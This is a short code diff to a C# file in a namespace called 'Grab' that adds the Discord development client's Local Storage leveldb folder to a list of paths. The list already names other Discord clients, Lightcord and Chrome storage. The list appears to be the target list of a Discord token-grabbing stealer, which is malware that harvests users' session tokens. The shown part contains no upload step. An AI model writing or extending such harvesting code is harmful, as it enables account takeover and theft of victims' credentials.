@@ -26,6 +26,7 @@ namespace Grab {
             list.Add(APPDATA + "\\Discord\\Local Storage\\leveldb\\");
             list.Add(APPDATA + "\\discordcanary\\Local Storage\\leveldb\\");
             list.Add(APPDATA + "\\discordptb\\Local Storage\\leveldb\\");
+            list.Add(APPDATA + "\\discorddevelopment\\Local Storage\\leveldb\\");
             list.Add(APPDATA + "\\Lightcord\\Local Storage\\leveldb\\");
 
             list.Add(LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
